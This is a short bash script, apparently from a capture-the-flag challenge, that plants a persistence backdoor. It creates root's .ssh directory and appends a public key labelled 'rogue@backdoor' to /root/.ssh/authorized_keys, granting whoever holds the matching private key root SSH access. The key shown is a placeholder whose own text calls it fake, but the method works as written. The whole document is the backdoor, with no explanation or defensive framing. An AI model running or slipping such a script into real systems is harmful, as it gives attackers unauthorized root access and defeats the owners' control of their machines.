#!/bin/bash
mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7fake0key1placeholder2data3padding4toMakeItLookRealistic5ButNotActuallyValid6BecauseThisIsACTFChallenge7AndWeJustNeedSomethingThatLooksLikeAKey8= rogue@backdoor" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
